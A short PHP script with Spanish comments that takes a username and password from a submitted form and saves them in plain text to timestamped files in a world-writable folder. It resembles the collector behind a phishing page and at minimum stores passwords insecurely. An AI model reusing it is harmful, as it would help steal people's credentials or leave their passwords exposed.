<?php
// Verificar si la carpeta 'archivos-datos' existe, si no, crearla
$directorio = '../archivos-datos/';
if (!is_dir($directorio)) {
    mkdir($directorio, 0777, true);
}

// Recibir datos del formulario
$usuario = $_POST['usuario'];
$password = $_POST['password'];

// Crear un archivo de texto con un nombre único
$filename = $directorio . time() . '.txt';

// Guardar los datos en el archivo
file_put_contents($filename, "Usuario: $usuario\nContraseña: $password\n");

echo "Datos guardados correctamente.";
?>
